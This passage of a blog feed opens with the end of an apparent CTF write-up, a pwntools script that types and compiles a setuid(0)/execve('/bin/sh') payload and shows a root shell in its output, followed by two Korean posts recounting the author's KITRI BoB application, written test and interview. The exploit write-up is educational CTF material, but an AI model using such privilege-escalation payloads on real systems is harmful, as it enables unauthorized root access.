class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    r.sendlineafter(<span class="string">b&quot;~$&quot;</span>, <span class="string">b&quot;stty cols 47 rows 4&quot;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b&quot;~$&quot;</span>, <span class="string">b&quot;./app&quot;</span>)</span><br><span class="line"></span><br><span class="line">    payload = <span class="string">b&quot;main() &#123;setuid(0);execve(\&quot;/bin/sh\&quot;,0,0);&#125;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> payload:</span><br><span class="line">        input_key(c)</span><br><span class="line"></span><br><span class="line">    clean()</span><br><span class="line">    <span class="built_in">compile</span>()</span><br><span class="line"></span><br><span class="line">    r.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ./ex.py</span><br><span class="line"><span class="comment"># ...</span></span><br><span class="line">    b<span class="string">&#x27;-----------------------------------------------main() &#123;setuid(0);execve(&quot;/bin/sh&quot;,0,0);&#125;      \r\n&#x27;</span></span><br><span class="line">    b<span class="string">&#x27;                                               \r\n&#x27;</span></span><br><span class="line">    b<span class="string">&#x27;-----------------------------------------------\r\n&#x27;</span></span><br><span class="line">    b<span class="string">&quot;:compiletmp/c7fd17d084a218713d385deb3df85bd1.c:1:1: warning: return type defaults to &#x27;int&#x27; [-Wimplicit-int]\r\n&quot;</span></span><br><span class="line">    b<span class="string">&#x27;    1 | main() &#123;setuid(0);execve(&quot;/bin/sh&quot;,0,0);&#125;\r\n&#x27;</span></span><br><span class="line">    b<span class="string">&#x27;      | ^~~~\r\n&#x27;</span></span><br><span class="line">    b<span class="string">&quot;tmp/c7fd17d084a218713d385deb3df85bd1.c: In function &#x27;main&#x27;:\r\n&quot;</span></span><br><span class="line">    b<span class="string">&quot;tmp/c7fd17d084a218713d385deb3df85bd1.c:1:9: warning: implicit declaration of function &#x27;setuid&#x27; [-Wimplicit-function-declaration]\r\n&quot;</span></span><br><span class="line">    b<span class="string">&#x27;    1 | main() &#123;setuid(0);execve(&quot;/bin/sh&quot;,0,0);&#125;\r\n&#x27;</span></span><br><span class="line">    b<span class="string">&#x27;      |         ^~~~~~\r\n&#x27;</span></span><br><span class="line">    b<span class="string">&quot;tmp/c7fd17d084a218713d385deb3df85bd1.c:1:19: warning: implicit declaration of function &#x27;execve&#x27; [-Wimplicit-function-declaration]\r\n&quot;</span></span><br><span class="line">    b<span class="string">&#x27;    1 | main() &#123;setuid(0);execve(&quot;/bin/sh&quot;,0,0);&#125;\r\n&#x27;</span></span><br><span class="line">    b<span class="string">&#x27;      |                   ^~~~~~\r\n&#x27;</span></span><br><span class="line">    b<span class="string">&#x27;# &#x27;</span></span><br><span class="line"><span class="comment"># ...</span></span><br><span class="line"><span class="comment"># $ id</span></span><br><span class="line">[DEBUG] Sent 0x3 bytes:</span><br><span class="line">    b<span class="string">&#x27;id\n&#x27;</span></span><br><span class="line">[DEBUG] Received 0x4 bytes:</span><br><span class="line">    b<span class="string">&#x27;id\r\n&#x27;</span></span><br><span class="line"></span><br><span class="line">[DEBUG] Received 0x2c bytes:</span><br><span class="line">    b<span class="string">&#x27;uid=0(root) gid=1000(ctf) groups=1000(ctf)\r\n&#x27;</span></span><br></pre></td></tr></table></figure>
<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/katex/dist/katex.min.css">
<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/markdown-it-texmath/css/texmath.min.css">
]]></content>
      <categories>
        <category>Security</category>
        <category>CTF</category>
      </categories>
  </entry>
  <entry>
    <title>KITRI BoB 9기 최종합격 / 서류, 면접 후기 (1)</title>
    <url>/2022/06/09/kitri-bob-9-1/</url>
    <content><![CDATA[<h2 id="%EA%B0%9C%EC%9A%94" tabindex="-1">개요</h2>
<p><img src="/images/kitri-bob-9-1/1.png" alt="1.png"></p>
<p>감사하게도 적지 않은 분들의 큰 도움으로 KITRI BoB 9기에 최종 합격할 수 있었습니다. 이번 글에서는 그간 준비 과정과 서류, 면접 경험을 공유하여 다른 분들께 많은 도움이 되었으면 합니다.</p>
<h2 id="%EC%A4%80%EB%B9%84-%EA%B3%BC%EC%A0%95" tabindex="-1">준비 과정</h2>
<ul>
<li>공부는 고등학생 때 웹 해킹을 잠깐, 대학 진학 후 시스템 해킹을 일년 반 정도 공부했습니다.</li>
<li>공부한 내용을 주로 동아리 스터디에서 공유하면서, 동아리 활동 경험 부분에서 할 이야기가 많아졌습니다.</li>
<li>주로 워게임 문제를 풀면서 공부한 내용을 복습했습니다.
<ul>
<li><a href="http://pwnable.kr/">pwnable.kr</a>을 절반, <a href="https://pwnable.xyz/">pwnable.xyz</a>는 7문제 정도 제외하고 전부 풀었습니다.</li>
</ul>
</li>
</ul>
<h2 id="%EC%84%9C%EB%A5%98-%EC%A0%84%ED%98%95" tabindex="-1">서류 전형</h2>
<ul>
<li>자기소개서는 7개 문항에 각 1,000자씩으로 작년과 동일했습니다.</li>
<li>자기소개
<ul>
<li>해킹을 접하고 공부하게 된 계기, 대학교 1~2학년 때 공부하고 활동한 이야기를 주로 적었습니다.</li>
<li>저는 공부할 때 문서나 백서, 전공서적을 참고하는 것을 중요하게 생각하는데, 그 부분을 강조하였습니다.</li>
<li>보안과 관련된 어떤 주제를 왜, 어떻게 공부해서 어떤 성과를 냈는지가 충분히 포함되면 좋을 듯 합니다.</li>
</ul>
</li>
<li>본인이 이룬 가장 큰 성과 및 사례
<ul>
<li>전공수업에서 학교 포털시스템을 모의해킹할 기회가 있었는데, 그 때 경험과 느낀 점을 적었습니다.</li>
<li>이 항목은 개인차가 크겠지만, 어떤 계기로 어떤 기술을 사용했고, 어떤 것을 배웠다는 내용이면 좋을 듯 합니다.</li>
</ul>
</li>
<li>지원 동기
<ul>
<li>저는 크게 지원한 이유와, BoB에서 나 자신을 위해, 사회를 위해 하고 싶은 일로 나누었습니다.</li>
<li>지원 동기에서 열정과 목표가 드러나고, 그 목표를 실현 가능하다는 실력이나 잠재력의 근거가 다른 항목과 같이 충분히 드러나면 좋을 듯 합니다.</li>
</ul>
</li>
<li>합격 후 포부
<ul>
<li>CTF에 나가고 싶다, 현실 사례를 이야기하며 이런 프로젝트를 해보고 싶다는 내용을 주로 적었습니다.</li>
<li>이 항목은 정말 BoB에서 하고 싶은 일을 조리있게 적으면 될 것 같습니다.</li>
</ul>
</li>
<li>관심 분야
<ul>
<li>저는 시스템 해킹 분야에서 공부하며 기록을 남기고, 동아리원들과 스터디한 이야기를 적었습니다.</li>
<li>지원한 트랙과 관련하여 경험이 어느 정도 있는 분들은 상세한 경험을 관심분야 항목에 녹여내면 좋을 듯 합니다.</li>
<li>경험이 많지 않은 분들도 이런 분야에 흥미가 있으며, 그래서 이런 내용을 지금 공부하고 있다는 내용이 있으면 충분합니다.</li>
</ul>
</li>
<li>BoB 학습계획
<ul>
<li>BoB 홈페이지에서는 공통 교육 기간에 모든 트랙의 기초 수업을, 트랙별 교육 단계에서 심화된 내용을 교육한다고 밝히고 있습니다.</li>
<li>따라서 공통 교육 단계에서 기초적인 소양을 키우고, 트랙별 교육 단계에서 본인이 관심있는 분야의 이떤 세부적인 주제를 공부하겠다는 내용이 좋을 듯 합니다.</li>
</ul>
</li>
<li>진로 계획
<ul>
<li>진로 계획은 학습 계획과 달리 BoB 이수 이후에 초점을 맞춘 항목입니다.</li>
<li>그러므로 랩 인턴, 취업, 연구 등을 통해 관심있는 분야의 최신 주제를 공부하고 전문가가 되겠다는 포부를 밝히면 좋을 듯 합니다.</li>
</ul>
</li>
</ul>
<p>필기와 면접 이야기는 <a href="/2022/06/18/kitri-bob-9-2/">다음 글</a>에서 계속하겠습니다. 서류 전형과 관련해 질문이 있으시면, 댓글이나 이메일 통해서 최대한 답변 드리겠습니다!</p>
<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/katex/dist/katex.min.css">
<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/markdown-it-texmath/css/texmath.min.css">
]]></content>
      <categories>
        <category>Thoughts</category>
      </categories>
  </entry>
  <entry>
    <title>KITRI BoB 9기 최종합격 / 서류, 면접 후기 (2)</title>
    <url>/2022/06/18/kitri-bob-9-2/</url>
    <content><![CDATA[<h2 id="%EA%B0%9C%EC%9A%94" tabindex="-1">개요</h2>
<p><a href="/2022/06/09/kitri-bob-9-1/">이전 글</a>에서 이어지는 KITRI BoB 합격 후기입니다. 이번 글에서는 제가 지원한 취약점분석 트랙의 필기, 면접 전형 경험을 공유해보려고 합니다.</p>
<p><img src="/images/kitri-bob-9-2/1.png" alt="1.png"></p>
<h2 id="%ED%95%84%EA%B8%B0-%EC%A0%84%ED%98%95" tabindex="-1">필기 전형</h2>
<ul>
<li>올해 처음 도입된 CTF형 필기 전형입니다.</li>
<li>기존 필기 전형과 유사한 객관식 몇 문제를 제외하면, 실제 파일을 주고 플래그를 찾아 write-up과 함께 업로드해야 합니다.
<ul>
<li>시스템 해킹, 웹 해킹, 리버싱, 암호학과 알고리즘 문제까지 출제되었습니다.</li>
</ul>
</li>
<li>솔직히 말해서 제일 쉬운 한 문제 빼고는 전부 시간 내에 풀지 못했습니다.</li>
<li>다음날 멘탈을 잡고 나머지 문제를 복기한 결과 이런 결론을 얻었습니다.
<ul>
<li>생각보다 문제는 어렵지 않았습니다.</li>
<li>그런데 불친절한 문제는 꽤 많습니다. (e.g. 정적 컴파일된 바이너리)</li>
</ul>
</li>
<li>CTF 경험이 많지 않은 초심자 분들은 분석해 볼 만한 문제를 하나 잡고 끝까지 파고드는 전략이 유효할 것 같습니다.
<ul>
<li>시간이 꽤 촉박하니, 몇 시간씩 걸릴 것 같은 문제는 과감히 포기하는 편이 나을 수도 있습니다.</li>
</ul>
</li>
<li>그리고 필기 전형 후에도 풀지 못한 문제를 꼭 다시 살펴봐야 면접 전형에서도 도움이 될 가능성이 높습니다.
<ul>
<li>일부 멘토님은 고난도 문제의 풀이 방법을 물어보는 경우가 있습니다.<br>
<br></li>
</ul>
</li>
</ul>
<p><img src="/images/kitri-bob-9-2/2.png" alt="2.png"></p>
<h2 id="%EB%A9%B4%EC%A0%91-%EC%A0%84%ED%98%95" tabindex="-1">면접 전형</h2>
<ul>
<li>면접도 바뀌어, 기존의 학습 계획이나 하고 싶은 프로젝트 발표는 진행하지 않습니다.</li>
<li>3분 자기소개가 추가되었고, 취약점분석 트랙은 발표자료 없이 구두로 진행합니다.
<ul>
<li>3분 자기소개를 준비하면서 유튜브 인싸담당자 님의 <a href="https://www.youtube.com/watch?v=DSBJXuDyDOY&amp;t=55s">영상</a>이 많은 도움이 되었습니다.</li>
<li>기술 면접에 가까운 성격을 고려할 때, 수사법으로 열정을 강조하는 대신 나는 이런 사람이고, 이런 경험을 했고, 이런 걸 느끼고 배웠으며, 앞으로 이런 일을 하고 싶어 지원했다는 내용을 담담히 이야기하는 것이 좋겠습니다.</li>
<li>저는 내용을 외우고 발표하는 편이 강약을 주거나 감정을 조절할 때 도움이 되었습니다.</li>
</ul>
</li>
<li>제가 입장한 면접실은 멘토님 두 분에 지원자 세 명이 입장했습니다.</li>
<li>저는 대부분 “~를 공부했다고 했는데 ~를 아느냐”, &quot;~에 대해 설명해보아라&quot;와 같은 질문을 받았습니다.
<ul>
<li>IE 1-day를 공부했다는 내용에서 &quot;IE의 MemGC 보호 기법에 대해 학습했느냐&quot;는 질문을 받았는데, 솔직하게 처음 들어본다고 말씀드렸더니 다음 질문으로 넘어가셨습니다.</li>
</ul>
</li>
<li>제가 받은 질문의 경우 대부분 자기소개서와 3분 자기소개에서 겹치는 소소재에 대한 내용을 물어보셨습니다.</li>
<li>따라서 서류나 자기소개에 강조한 내용에 대해서는 예상 질문을 스스로 만들어 보시고 대비하는 것이 좋을 것 같습니다.</li>
</ul>
<p>합격 이후 마음을 추스리고 정리해 보았는데, 많은 분들께 도움이 되었으면 좋겠습니다. 글 내용과 관련된 질문은 댓글이나 연락 주시면 상세히 답변드리겠습니다. 마지막으로 BoB 지원의 전 과정에서 전폭적으로 도움을 받았던 고려대학교 이희조 교수님과 김영훈 선배, 그리고 응원해주신 모든 분들께 감사드립니다.</p>
<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/katex/dist/katex.min.css">
<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/markdown-it-texmath/css/texmath.min.css">
]]></content>
      <categories>
        <category>Thoughts</category>
      </categories>
  </entry>
</search>
